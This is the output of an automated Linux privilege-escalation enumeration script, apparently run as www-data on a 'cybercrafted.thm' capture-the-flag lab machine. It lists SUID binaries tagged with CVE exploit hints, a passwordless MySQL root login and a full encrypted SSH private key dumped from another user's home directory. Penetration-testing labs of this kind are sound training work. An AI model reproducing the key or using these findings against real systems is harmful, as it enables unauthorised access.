uid=13(proxy) gid=13(proxy) groups=13(proxy)
uid=2(bin) gid=2(bin) groups=2(bin)
uid=3(sys) gid=3(sys) groups=3(sys)
uid=33(www-data) gid=33(www-data) groups=33(www-data)
uid=34(backup) gid=34(backup) groups=34(backup)
uid=38(list) gid=38(list) groups=38(list)
uid=39(irc) gid=39(irc) groups=39(irc)
uid=4(sync) gid=65534(nogroup) groups=65534(nogroup)
uid=41(gnats) gid=41(gnats) groups=41(gnats)
uid=5(games) gid=60(games) groups=60(games)
uid=6(man) gid=12(man) groups=12(man)
uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
uid=7(lp) gid=7(lp) groups=7(lp)
uid=8(mail) gid=8(mail) groups=8(mail)
uid=9(news) gid=9(news) groups=9(news)

╔══════════╣ Login now
 13:14:51 up  2:09,  0 users,  load average: 0.42, 0.17, 0.15                                                                                                      
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT

╔══════════╣ Last logons
reboot   system boot  Sat Jun 26 16:34:08 2021 - Sat Jun 26 16:35:43 2021  (00:01)     0.0.0.0                                                                     
thm      tty1         Sat Jun 26 14:23:52 2021 - down                      (02:08)     0.0.0.0
reboot   system boot  Sat Jun 26 14:23:28 2021 - Sat Jun 26 16:32:41 2021  (02:09)     0.0.0.0
thm      tty1         Sat Jun 26 10:50:56 2021 - down                      (02:22)     0.0.0.0
reboot   system boot  Sat Jun 26 10:50:22 2021 - Sat Jun 26 13:13:04 2021  (02:22)     0.0.0.0
thm      tty1         Sat Jun 26 10:47:39 2021 - down                      (00:02)     0.0.0.0
thm      tty1         Sat Jun 26 10:27:48 2021 - Sat Jun 26 10:46:58 2021  (00:19)     0.0.0.0
reboot   system boot  Sat Jun 26 10:15:46 2021 - Sat Jun 26 10:49:42 2021  (00:33)     0.0.0.0

wtmp begins Sat Jun 26 10:15:46 2021

╔══════════╣ Last time logon each user
Username         Port     From             Latest                                                                                                                  

╔══════════╣ Do not forget to test 'su' as any other user with shell: without password and with their names as password (I can't do it...)
                                                                                                                                                                   
╔══════════╣ Do not forget to execute 'sudo -l' without password or with valid password (if you know it)!!
                                                                                                                                                                   


                                       ╔══════════════════════╗
═══════════════════════════════════════╣ Software Information ╠═══════════════════════════════════════                                                             
                                       ╚══════════════════════╝                                                                                                    
╔══════════╣ Useful software
/usr/bin/base64                                                                                                                                                    
/usr/bin/curl
/usr/bin/gcc
/usr/bin/lxc
/bin/nc
/bin/netcat
/usr/bin/perl
/usr/bin/php
/bin/ping
/usr/bin/python3
/usr/bin/python3.6
/usr/bin/sudo
/usr/bin/wget

╔══════════╣ Installed Compilers
ii  gcc                                    4:7.4.0-1ubuntu2.3                              amd64        GNU C compiler                                             
ii  gcc-7                                  7.5.0-3ubuntu1~18.04                            amd64        GNU C compiler
/usr/bin/gcc

╔══════════╣ MySQL version
mysql  Ver 14.14 Distrib 5.7.35, for Linux (x86_64) using  EditLine wrapper                                                                                        

═╣ MySQL connection using default root/root ........... No
═╣ MySQL connection using root/toor ................... No                                                                                                         
═╣ MySQL connection using root/NOPASS ................. Yes                                                                                                        
User    Host    authentication_string
root    localhost
mysql.session   localhost       *THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE
mysql.sys       localhost       *THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE
debian-sys-maint        localhost       *A73B2A5E6692EE82361407AC83BFB67EAA02D31C

╔══════════╣ Searching mysql credentials and exec
From '/etc/mysql/mysql.conf.d/mysqld.cnf' Mysql user: user              = mysql                                                                                    
Found readable /etc/mysql/my.cnf
!includedir /etc/mysql/conf.d/
!includedir /etc/mysql/mysql.conf.d/

╔══════════╣ Analyzing MariaDB Files (limit 70)
                                                                                                                                                                   
-rw------- 1 root root 317 Sep 12  2021 /etc/mysql/debian.cnf

╔══════════╣ Analyzing Apache Files (limit 70)
Version: Server version: Apache/2.4.29 (Ubuntu)                                                                                                                    
Server built:   2021-09-28T11:01:16
httpd Not Found
                                                                                                                                                                   
══╣ PHP exec extensions
/etc/apache2/mods-enabled/php7.2.conf-<FilesMatch ".+\.ph(ar|p|tml)$">                                                                                             
/etc/apache2/mods-enabled/php7.2.conf:    SetHandler application/x-httpd-php
--
/etc/apache2/mods-enabled/php7.2.conf-<FilesMatch ".+\.phps$">
/etc/apache2/mods-enabled/php7.2.conf:    SetHandler application/x-httpd-php-source
--
/etc/apache2/mods-available/php7.2.conf-<FilesMatch ".+\.ph(ar|p|tml)$">
/etc/apache2/mods-available/php7.2.conf:    SetHandler application/x-httpd-php
--
/etc/apache2/mods-available/php7.2.conf-<FilesMatch ".+\.phps$">
/etc/apache2/mods-available/php7.2.conf:    SetHandler application/x-httpd-php-source
drwxr-xr-x 2 root root 4096 Sep 12  2021 /etc/apache2/sites-enabled
drwxr-xr-x 2 root root 4096 Sep 12  2021 /etc/apache2/sites-enabled
lrwxrwxrwx 1 root root 32 Sep 12  2021 /etc/apache2/sites-enabled/main.thm.conf -> ../sites-available/main.thm.conf
        ServerName cybercrafted.thm
        ServerAlias www.cybercrafted.thm
        ServerName store.cybercrafted.thm
        ServerAlias www.store.cybercrafted.thm
        ServerName admin.cybercrafted.thm
        ServerAlias www.admin.cybercrafted.thm


-rw-r--r-- 1 root root 1328 Jun 26  2021 /etc/apache2/sites-available/000-default.conf
<VirtualHost *:80>
        # The ServerName directive sets the request scheme, hostname and port that
        # the server uses to identify itself. This is used when creating
        # redirection URLs. In the context of virtual hosts, the ServerName
        # specifies what hostname must appear in the request's Host: header to
        # match this virtual host. For the default virtual host (this file) this
        # value is not decisive as it is used as a last resort host regardless.
        # However, you must set it for any further virtual host explicitly.
        #ServerName www.example.com
        ServerAdmin admin@localhost
        DocumentRoot /var/www/html
        # Available loglevels: trace8, ..., trace1, debug, info, notice, warn,
        # error, crit, alert, emerg.
        # It is also possible to configure the loglevel for particular
        # modules, e.g.
        #LogLevel info ssl:warn
        ErrorLog ${APACHE_LOG_DIR}/error.log
        CustomLog ${APACHE_LOG_DIR}/access.log combined
        # For most configuration files from conf-available/, which are
        # enabled or disabled at a global level, it is possible to
        # include a line for only one particular virtual host. For example the
        # following line enables the CGI configuration for this host only
        # after it has been globally disabled with "a2disconf".
        #Include conf-available/serve-cgi-bin.conf
</VirtualHost>
# vim: syntax=apache ts=4 sw=4 sts=4 sr noet

-rw-r--r-- 1 root root 71817 Oct  7  2020 /etc/php/7.2/apache2/php.ini
allow_url_fopen = On
allow_url_include = Off
odbc.allow_persistent = On
ibase.allow_persistent = 1
mysqli.allow_persistent = On
pgsql.allow_persistent = On
-rw-r--r-- 1 root root 71429 Oct  7  2020 /etc/php/7.2/cli/php.ini
allow_url_fopen = On
allow_url_include = Off
odbc.allow_persistent = On
ibase.allow_persistent = 1
mysqli.allow_persistent = On
pgsql.allow_persistent = On

╔══════════╣ Analyzing Rsync Files (limit 70)
-rw-r--r-- 1 root root 1044 Feb 14  2020 /usr/share/doc/rsync/examples/rsyncd.conf                                                                                 
[ftp]
        comment = public archive
        path = /var/www/pub
        use chroot = yes
        lock file = /var/lock/rsyncd
        read only = yes
        list = yes
        uid = nobody
        gid = nogroup
        strict modes = yes
        ignore errors = no
        ignore nonreadable = yes
        transfer logging = no
        timeout = 600
        refuse options = checksum dry-run
        dont compress = *.gz *.tgz *.zip *.z *.rpm *.deb *.iso *.bz2 *.tbz


╔══════════╣ Analyzing Ldap Files (limit 70)
The password hash is from the {SSHA} to 'structural'                                                                                                               
drwxr-xr-x 2 root root 4096 Jun 26  2021 /etc/ldap


╔══════════╣ Searching ssl/ssh files
╔══════════╣ Analyzing SSH Files (limit 70)                                                                                                                        
                                                                                                                                                                   
-rw-r--r-- 1 xxultimatecreeperxx xxultimatecreeperxx 1766 Jun 27  2021 /home/xxultimatecreeperxx/.ssh/id_rsa
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,3579498908433674083EAAD00F2D89F6
Sc3FPbCv/4DIpQUOalsczNkVCR+hBdoiAEM8mtbF2RxgoiV7XF2PgEehwJUhhyDG
+Bb/uSiC1AsL+UO8WgDsbSsBwKLWijmYCmsp1fWp3xaGX2qVVbmI45ch8ef3QQ1U
SCc7TmWJgI/Bt6k9J60WNThmjKdYTuaLymOVJjiajho799BnAQWE89jOLwE3VA5m
SfcytNIJkHHQR67K2z2f0noCh2jVkM0sx8QS+hUBeNWT6lr3pEoBKPk5BkRgbpAu
lSkN+Ubrq2/+DA1e/LB9u9unwi+zUec1G5utqfmNPIHYyB2ZHWpX8Deyq5imWwH9
FkqfnN3JpXIW22TOMPYOOKAjan3XpilhOGhbZf5TUz0StZmQfozp5WOU/J5qBTtQ
sXG4ySXCWGEq5Mtj2wjdmOBIjbmVURWklbsN+R6UiYeBE5IViA9sQTPXcYnfDNPm
stB2ukMrnmINOu0U2rrHFqOwNKELmzSr7UmdxiHCWHNOSzH4jYl0zjWI7NZoTLNA
eE214PUmIhiCkNWgcymwhJ5pTq5tUg3OUeq6sSDbvU8hCE6jjq5+zYlqs+DkIW2v
VeaVnbA2hij69kGQi/ABtS9PrvRDj/oSIO4YMyZIhvnH+miCjNUNxVuH1k3LlD/6
LkvugR2wXG2RVdGNIwrhtkz8b5xaUvLY4An/rgJpn8gYDjIJj66uKQs5isdzHSlf
jOjh5qkRyKYFfPegK32iDfeD3F314L3KBaAlSktPKpQ+ooqUtTa+Mngh3CL8JpOO
Hi6qk24cpDUx68sSt7wIzdSwyYW4A/h0vxnZSsU6kFAqR28/6pjThHoQ0ijdKgpO
8wj/u29pyQypilQoWO52Kis4IzuMN6Od+R8L4RnCV3bBR4ppDAnW3ADP312FajR+
DQAHHtfpQJYH92ohpj3dF5mJTT+aL8MfAhSUF12Mnn9d9MEuGRKIwHWF4d1K69lr
0GpRSOxDrAafNnfZoykOPRjZsswK3YXwFu3xWQFl3mZ7N+6yDOSTpJgJuNfiJ0jh
MBMMh4+r7McEOhl4f4jd0PHPf3TdxaONzHtAoj69JYDIrxwJ28DtVuyk89pu2bY7
mpbcQFcsYHXv6Evh/evkSGsorcKHv1Uj3BCchL6V4mZmeJfnde6EkINNwRW8vDY+
gIYqA/r2QbKOdLyHD+xP4SpX7VVFliXXW9DDqdfLJ6glMNNNbM1mEzHBMywd1IKE
Zm+7ih+q4s0RBClsV0IQnzCrSij//4urAN5ZaEHf0k695fYAKMs41/bQ/Tv7kvNc
T93QJjphRwSKdyQIuuDsjCAoB7VuMI4hCrEauTavXU82lmo1cALeNSgvvhxxcd7r
1egiyyvHzUtOUP3RcOaxvHwYGQxGy1kq88oUaE7JrV2iSHBQTy6NkCV9j2RlsGZY
fYGHuf6juOc3Ub1iDV1B4Gk0964vclePoG+rdMXWK+HmdxfNHDiZyN4taQgBp656
RKTM49I7MsdD/uTK9CyHQGE9q2PekljkjdzCrwcW6xLhYILruayX1B4IWqr/p55k
v6+jjQHOy6a0Qm23OwrhKhO8kn1OdQMWqftf2D3hEuBKR/FXLIughjmyR1j9JFtJ
-----END RSA PRIVATE KEY-----



-rw-r--r-- 1 xxultimatecreeperxx xxultimatecreeperxx 414 Jun 27  2021 /home/xxultimatecreeperxx/.ssh/authorized_keys
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCujxl8VJ5ZqkNb8zznyHX1ql42X8PiJ/4BrWOR9Oytc6wghw2SM7QC5iajDwA/ZMxY3zyTz3m79w/0eVV39TFCP/UsY3rybk0RJMfXX+24TwTThx1NZGcliMz9jSA5FaxCV9SebGyFOFcIPxeBDx86vLOrTN/hizefiYzq0C/wDVrc9PY9GuFnC0txjVZqLm1ZW92tb7LqsCO551MHerx3+bmmSDqhuWqKE1zAB/4eWhqL3leuhSr4lTjGn2MuxKh7TIdP1BqOqcCcgbB5ELnVbNGLlxUS+kBp1+u9UzzUYQ0whYLKUxePZyDNtHcPiUjH5cMj3ZGidsJRKbPPzVUN xxultimatecreeperxx@cybercrafted

ChallengeResponseAuthentication no
UsePAM yes
PasswordAuthentication yes

══╣ Possible private SSH keys were found!
/home/xxultimatecreeperxx/.ssh/id_rsa

══╣ Some certificates were found (out limited):
/etc/pollinate/entropy.ubuntu.com.pem                                                                                                                              
3161PSTORAGE_CERTSBIN

gpg-connect-agent: no running gpg-agent - starting '/usr/bin/gpg-agent'
gpg-connect-agent: failed to create temporary file '/var/www/.gnupg/.#lk0x00005632207422f0.cybercrafted.9755': No such file or directory
gpg-connect-agent: can't connect to the agent: No such file or directory
gpg-connect-agent: error sending standard options: No agent running
══╣ Some home ssh config file was found
/usr/share/openssh/sshd_config                                                                                                                                     
ChallengeResponseAuthentication no
UsePAM yes
X11Forwarding yes
PrintMotd no
AcceptEnv LANG LC_*
Subsystem       sftp    /usr/lib/openssh/sftp-server

══╣ /etc/hosts.allow file found, trying to read the rules:
/etc/hosts.allow                                                                                                                                                   


Searching inside /etc/ssh/ssh_config for interesting info
Host *
    SendEnv LANG LC_*
    HashKnownHosts yes
    GSSAPIAuthentication yes

╔══════════╣ Analyzing PAM Auth Files (limit 70)
drwxr-xr-x 2 root root 4096 Sep 12  2021 /etc/pam.d                                                                                                                
-rw-r--r-- 1 root root 2133 Mar  4  2019 /etc/pam.d/sshd




╔══════════╣ Searching tmux sessions
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-shell-sessions                                                                                  
tmux 2.6                                                                                                                                                           


/tmp/tmux-33
╔══════════╣ Analyzing Cloud Init Files (limit 70)
-rw-r--r-- 1 root root 3559 May 11  2021 /etc/cloud/cloud.cfg                                                                                                      
     lock_passwd: True

╔══════════╣ Analyzing Keyring Files (limit 70)
drwxr-xr-x 2 root root 4096 Jun 26  2021 /usr/share/keyrings                                                                                                       




╔══════════╣ Searching uncommon passwd files (splunk)
passwd file: /etc/pam.d/passwd                                                                                                                                     
passwd file: /etc/passwd
passwd file: /usr/share/bash-completion/completions/passwd
passwd file: /usr/share/lintian/overrides/passwd

╔══════════╣ Analyzing PGP-GPG Files (limit 70)
/usr/bin/gpg                                                                                                                                                       
gpg Not Found
netpgpkeys Not Found                                                                                                                                               
netpgp Not Found                                                                                                                                                   
                                                                                                                                                                   
-rw-r--r-- 1 root root 2796 Mar 29  2021 /etc/apt/trusted.gpg.d/ubuntu-keyring-2012-archive.gpg
-rw-r--r-- 1 root root 2794 Mar 29  2021 /etc/apt/trusted.gpg.d/ubuntu-keyring-2012-cdimage.gpg
-rw-r--r-- 1 root root 1733 Mar 29  2021 /etc/apt/trusted.gpg.d/ubuntu-keyring-2018-archive.gpg
-rw-r--r-- 1 root root 3267 Jan 16  2021 /usr/share/gnupg/distsigkey.gpg
-rw-r--r-- 1 root root 2274 May 27  2021 /usr/share/keyrings/ubuntu-advantage-cis.gpg
-rw-r--r-- 1 root root 2236 May 27  2021 /usr/share/keyrings/ubuntu-advantage-esm-apps.gpg
-rw-r--r-- 1 root root 2264 May 27  2021 /usr/share/keyrings/ubuntu-advantage-esm-infra-trusty.gpg
-rw-r--r-- 1 root root 2275 May 27  2021 /usr/share/keyrings/ubuntu-advantage-fips.gpg
-rw-r--r-- 1 root root 7399 Sep 17  2018 /usr/share/keyrings/ubuntu-archive-keyring.gpg
-rw-r--r-- 1 root root 6713 Oct 27  2016 /usr/share/keyrings/ubuntu-archive-removed-keys.gpg
-rw-r--r-- 1 root root 4097 Feb  6  2018 /usr/share/keyrings/ubuntu-cloudimage-keyring.gpg
-rw-r--r-- 1 root root 0 Jan 17  2018 /usr/share/keyrings/ubuntu-cloudimage-removed-keys.gpg
-rw-r--r-- 1 root root 1227 May 27  2010 /usr/share/keyrings/ubuntu-master-keyring.gpg
-rw-r--r-- 1 root root 2867 Feb 22  2018 /usr/share/popularity-contest/debian-popcon.gpg

drwx------ 3 xxultimatecreeperxx xxultimatecreeperxx 4096 Jun 27  2021 /home/xxultimatecreeperxx/.gnupg

╔══════════╣ Analyzing Cache Vi Files (limit 70)
                                                                                                                                                                   
lrwxrwxrwx 1 root root 9 Oct 15 20:43 /home/xxultimatecreeperxx/.viminfo -> /dev/null

╔══════════╣ Kubernetes information
                                                                                                                                                                   
╔══════════╣ Analyzing Postfix Files (limit 70)
-rw-r--r-- 1 root root 675 Apr  2  2018 /usr/share/bash-completion/completions/postfix                                                                             


╔══════════╣ Analyzing FTP Files (limit 70)
                                                                                                                                                                   

-rw-r--r-- 1 root root 69 Oct  7  2020 /etc/php/7.2/mods-available/ftp.ini
-rw-r--r-- 1 root root 69 Jul  5  2021 /usr/share/php7.2-common/common/ftp.ini






╔══════════╣ Analyzing Bind Files (limit 70)
-rw-r--r-- 1 root root 856 Apr  2  2018 /usr/share/bash-completion/completions/bind                                                                                
-rw-r--r-- 1 root root 856 Apr  2  2018 /usr/share/bash-completion/completions/bind



╔══════════╣ Analyzing Windows Files Files (limit 70)
                                                                                                                                                                   





















lrwxrwxrwx 1 root root 20 Jun 26  2021 /etc/alternatives/my.cnf -> /etc/mysql/mysql.cnf
lrwxrwxrwx 1 root root 24 Jun 26  2021 /etc/mysql/my.cnf -> /etc/alternatives/my.cnf
-rw-r--r-- 1 root root 81 Sep 12  2021 /var/lib/dpkg/alternatives/my.cnf



























╔══════════╣ Analyzing Other Interesting Files Files (limit 70)
-rw-r--r-- 1 root root 3771 Apr  4  2018 /etc/skel/.bashrc                                                                                                         
-rw-r--r-- 1 xxultimatecreeperxx xxultimatecreeperxx 3771 Jun 27  2021 /home/xxultimatecreeperxx/.bashrc





-rw-r--r-- 1 root root 807 Apr  4  2018 /etc/skel/.profile
-rw-r--r-- 1 xxultimatecreeperxx xxultimatecreeperxx 807 Jun 27  2021 /home/xxultimatecreeperxx/.profile






                                         ╔═══════════════════╗
═════════════════════════════════════════╣ Interesting Files ╠═════════════════════════════════════════                                                            
                                         ╚═══════════════════╝                                                                                                     
╔══════════╣ SUID - Check easy privesc, exploits and write perms
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid                                                                                        
-rwsr-xr-x 1 root root 44K Mar 22  2019 /bin/su                                                                                                                    
-rwsr-xr-x 1 root root 31K Aug 11  2016 /bin/fusermount
-rwsr-xr-x 1 root root 43K Sep 16  2020 /bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
-rwsr-xr-x 1 root root 27K Sep 16  2020 /bin/umount  --->  BSD/Linux(08-1996)
-rwsr-xr-x 1 root root 63K Jun 28  2019 /bin/ping
-rwsr-xr-x 1 root root 19K Jun 28  2019 /usr/bin/traceroute6.iputils
-rwsr-xr-x 1 root root 146K Jan 19  2021 /usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable
-rwsr-xr-x 1 root root 37K Mar 22  2019 /usr/bin/newgidmap
-rwsr-xr-x 1 root root 59K Mar 22  2019 /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
-rwsr-sr-x 1 daemon daemon 51K Feb 20  2018 /usr/bin/at  --->  RTru64_UNIX_4.0g(CVE-2002-1614)
-rwsr-xr-x 1 root root 37K Mar 22  2019 /usr/bin/newuidmap
-rwsr-xr-x 1 root root 75K Mar 22  2019 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 22K Mar 27  2019 /usr/bin/pkexec  --->  Linux4.10_to_5.1.17(CVE-2019-13272)/rhel_6(CVE-2011-1485)
-rwsr-xr-x 1 root root 44K Mar 22  2019 /usr/bin/chsh
-rwsr-xr-x 1 root root 40K Mar 22  2019 /usr/bin/newgrp  --->  HP-UX_10.20
-rwsr-xr-x 1 root root 75K Mar 22  2019 /usr/bin/chfn  --->  SuSE_9.3/10
-rwsr-xr-- 1 root messagebus 42K Jun 11  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 99K Nov 23  2018 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
-rwsr-xr-x 1 root root 116K Mar 26  2021 /usr/lib/snapd/snap-confine  --->  Ubuntu_snapd<2.37_dirty_sock_Local_Privilege_Escalation(CVE-2019-7304)
-rwsr-xr-x 1 root root 427K Aug 11  2021 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 10K Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root root 14K Mar 27  2019 /usr/lib/policykit-1/polkit-agent-helper-1

╔══════════╣ SGID
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid                                                                                        
-rwxr-sr-x 1 root mlocate 43K Mar  1  2018 /usr/bin/mlocate                                                                                                        
-rwxr-sr-x 1 root crontab 39K Nov 16  2017 /usr/bin/crontab
-rwxr-sr-x 1 root tty 31K Sep 16  2020 /usr/bin/wall
-rwsr-sr-x 1 daemon daemon 51K Feb 20  2018 /usr/bin/at  --->  RTru64_UNIX_4.0g(CVE-2002-1614)
-rwxr-sr-x 1 root shadow 71K Mar 22  2019 /usr/bin/chage
-rwxr-sr-x 1 root shadow 23K Mar 22  2019 /usr/bin/expiry
-rwxr-sr-x 1 root ssh 355K Aug 11  2021 /usr/bin/ssh-agent
-rwxr-sr-x 1 root tty 14K Jan 17  2018 /usr/bin/bsd-write
-rwxr-sr-x 1 root utmp 10K Mar 11  2016 /usr/lib/x86_64-linux-gnu/utempter/utempter
-rwxr-sr-x 1 root shadow 34K Apr  8  2021 /sbin/pam_extrausers_chkpwd
-rwxr-sr-x 1 root shadow 34K Apr  8  2021 /sbin/unix_chkpwd

╔══════════╣ Checking misconfigurations of ld.so
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#ld-so                                                                                                
/etc/ld.so.conf                                                                                                                                                    
include /etc/ld.so.conf.d/*.conf

/etc/ld.so.conf.d
  /etc/ld.so.conf.d/libc.conf
/usr/local/lib
  /etc/ld.so.conf.d/x86_64-linux-gnu.conf
/usr/local/lib/x86_64-linux-gnu
/lib/x86_64-linux-gnu
/usr/lib/x86_64-linux-gnu

╔══════════╣ Capabilities
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#capabilities                                                                                         
Current capabilities:                                                                                                                                              
Current: =
CapInh: 0000000000000000
CapPrm: 0000000000000000
CapEff: 0000000000000000
CapBnd: 0000003fffffffff
CapAmb: 0000000000000000

Shell capabilities:
0x0000000000000000=
CapInh: 0000000000000000
CapPrm: 0000000000000000
CapEff: 0000000000000000
CapBnd: 0000003fffffffff
CapAmb: 0000000000000000

Files with capabilities (limited to 50):
/usr/bin/mtr-packet = cap_net_raw+ep

╔══════════╣ Users with capabilities
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#capabilities                                                                                         
                                                                                                                                                                   
╔══════════╣ Files with ACLs (limited to 50)
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#acls                                                                                                 
files with acls in searched folders Not Found                                                                                                                      
                                                                                                                                                                   
╔══════════╣ .sh files in path
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#script-binaries-in-path                                                                              
/usr/bin/gettext.sh                                                                                                                                                

╔══════════╣ Unexpected in root
/initrd.img                                                                                                                                                        
/initrd.img.old
/swap.img
/vmlinuz.old
/vmlinuz

╔══════════╣ Files (scripts) in /etc/profile.d/
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#profiles-files                                                                                       
total 36                                                                                                                                                           
drwxr-xr-x   2 root root 4096 Jun 26  2021 .
drwxr-xr-x 102 root root 4096 Oct 15 21:00 ..
-rw-r--r--   1 root root   96 Sep 27  2019 01-locale-fix.sh
-rw-r--r--   1 root root 1557 Dec  4  2017 Z97-byobu.sh
-rwxr-xr-x   1 root root 3417 Jun  3  2020 Z99-cloud-locale-test.sh
-rwxr-xr-x   1 root root  873 Jun  3  2020 Z99-cloudinit-warnings.sh
-rw-r--r--   1 root root  833 Feb  2  2021 apps-bin-path.sh
-rw-r--r--   1 root root  664 Apr  2  2018 bash_completion.sh
-rw-r--r--   1 root root 1003 Dec 29  2015 cedilla-portuguese.sh

╔══════════╣ Permissions in init, init.d, systemd, and rc.d
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#init-init-d-systemd-and-rc-d                                                                         
                                                                                                                                                                   
═╣ Hashes inside passwd file? ........... No
═╣ Writable passwd file? ................ No                                                                                                                       
═╣ Credentials in fstab/mtab? ........... No                                                                                                                       
═╣ Can I read shadow files? ............. No                                                                                                                       
═╣ Can I read shadow plists? ............ No                                                                                                                       
═╣ Can I write shadow plists? ........... No                                                                                                                       
═╣ Can I read opasswd file? ............. No                                                                                                                       
═╣ Can I write in network-scripts? ...... No                                                                                                                       
═╣ Can I read root folder? .............. No                                                                                                                       
                                                                                                                                                                   
╔══════════╣ Searching root files in home dirs (limit 30)
/home/                                                                                                                                                             
/home/xxultimatecreeperxx/.bash_history
/home/xxultimatecreeperxx/.viminfo
/root/

╔══════════╣ Searching folders owned by me containing others files on it (limit 100)
                                                                                                                                                                   
╔══════════╣ Readable files belonging to root and readable by me but not world readable
                                                                                                                                                                   
╔══════════╣ Modified interesting files in the last 5mins (limit 100)
/var/log/auth.log                                                                                                                                                  
/var/log/kern.log
/var/log/syslog
/var/log/journal/ebe56de9a97145f5aa1f42ef72793146/system.journal

╔══════════╣ Writable log files (logrotten) (limit 100)
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#logrotate-exploitation                                                                               
                                                                                                                                                                   
╔══════════╣ Files inside /home/www-data (limit 20)
                                                                                                                                                                   
╔══════════╣ Files inside others home (limit 20)
/home/xxultimatecreeperxx/.profile                                                                                                                                 
/home/xxultimatecreeperxx/.hushlogin
/home/xxultimatecreeperxx/.ssh/id_rsa
/home/xxultimatecreeperxx/.ssh/authorized_keys
/home/xxultimatecreeperxx/.bashrc
/home/xxultimatecreeperxx/.bash_logout

╔══════════╣ Searching installed mail applications
                                                                                                                                                                   
╔══════════╣ Mails (limit 50)
                                                                                                                                                                   
╔══════════╣ Backup folders
                                                                                                                                                                   
╔══════════╣ Backup files (limited 100)
-rw-r--r-- 1 root root 2746 Jan 23  2020 /usr/share/man/man8/vgcfgbackup.8.gz                                                                                      
-rw-r--r-- 1 root root 11755 Jun 26  2021 /usr/share/info/dir.old
-rw-r--r-- 1 root root 361345 Feb  2  2018 /usr/share/doc/manpages/Changes.old.gz
-rw-r--r-- 1 root root 7867 Nov  7  2016 /usr/share/doc/telnet/README.telnet.old.gz
-rwxr-xr-x 1 root root 226 Dec  4  2017 /usr/share/byobu/desktop/byobu.desktop.old
-rw-r--r-- 1 root root 1775 Feb 25  2021 /usr/lib/python3/dist-packages/sos/report/plugins/ovirt_engine_backup.py
-rw-r--r-- 1 root root 1424 Jun 26  2021 /usr/lib/python3/dist-packages/sos/report/plugins/__pycache__/ovirt_engine_backup.cpython-36.pyc
-rw-r--r-- 1 root root 35544 Mar 25  2020 /usr/lib/open-vm-tools/plugins/vmsvc/libvmbackup.so
-rw-r--r-- 1 root root 217443 Sep 20  2021 /usr/src/linux-headers-4.15.0-159-generic/.config.old
-rw-r--r-- 1 root root 0 Sep 20  2021 /usr/src/linux-headers-4.15.0-159-generic/include/config/net/team/mode/activebackup.h
-rw-r--r-- 1 root root 0 Sep 20  2021 /usr/src/linux-headers-4.15.0-159-generic/include/config/wm831x/backup.h
-rw-r--r-- 1 root root 217425 Aug 19  2021 /usr/src/linux-headers-4.15.0-156-generic/.config.old
-rw-r--r-- 1 root root 0 Aug 19  2021 /usr/src/linux-headers-4.15.0-156-generic/include/config/net/team/mode/activebackup.h
-rw-r--r-- 1 root root 0 Aug 19  2021 /usr/src/linux-headers-4.15.0-156-generic/include/config/wm831x/backup.h
-rw-r--r-- 1 root root 2765 Aug  6  2020 /etc/apt/sources.list.curtin.old
-rw-r--r-- 1 root root 8881 Aug 19  2021 /lib/modules/4.15.0-156-generic/kernel/drivers/net/team/team_mode_activebackup.ko
-rw-r--r-- 1 root root 9081 Aug 19  2021 /lib/modules/4.15.0-156-generic/kernel/drivers/power/supply/wm831x_backup.ko
-rw-r--r-- 1 root root 8881 Sep 20  2021 /lib/modules/4.15.0-159-generic/kernel/drivers/net/team/team_mode_activebackup.ko
-rw-r--r-- 1 root root 9081 Sep 20  2021 /lib/modules/4.15.0-159-generic/kernel/drivers/power/supply/wm831x_backup.ko

╔══════════╣ Searching tables inside readable .db/.sql/.sqlite files (limit 100)
Found: /var/lib/mlocate/mlocate.db: regular file, no read permission                                                                                               


╔══════════╣ Web files?(output limit)
/var/www/:                                                                                                                                                         
total 24K
drwxr-xr-x  6 root     root     4.0K Jun 26  2021 .
drwxr-xr-x 14 root     root     4.0K Jun 26  2021 ..
drwxr-xr-x  3 www-data www-data 4.0K Apr  2 13:14 admin
drwxr-xr-x  2 www-data www-data 4.0K Sep 12  2021 html
drwxr-xr-x  3 www-data www-data 4.0K Sep 12  2021 store
drwxr-xr-x  4 www-data www-data 4.0K Sep 12  2021 tld

/var/www/admin:

╔══════════╣ All hidden files (not in /sys/ or the ones listed in the previous check) (limit 70)
-rw-rw-r-- 1 xxultimatecreeperxx xxultimatecreeperxx 0 Jun 27  2021 /home/xxultimatecreeperxx/.hushlogin                                                           
-rw-r--r-- 1 xxultimatecreeperxx xxultimatecreeperxx 220 Jun 27  2021 /home/xxultimatecreeperxx/.bash_logout
-rw-r--r-- 1 root root 20 Apr  2 11:06 /run/cloud-init/.instance-id
-rw-r--r-- 1 root root 2 Apr  2 11:06 /run/cloud-init/.ds-identify.result
-rw-r--r-- 1 landscape landscape 0 Aug  6  2020 /var/lib/landscape/.cleanup.user
-rw-r--r-- 1 root root 2047 Apr 21  2021 /usr/lib/jvm/.java-1.11.0-openjdk-amd64.jinfo
-rw-r--r-- 1 root root 2764 Apr 21  2021 /usr/lib/jvm/.java-1.8.0-openjdk-amd64.jinfo
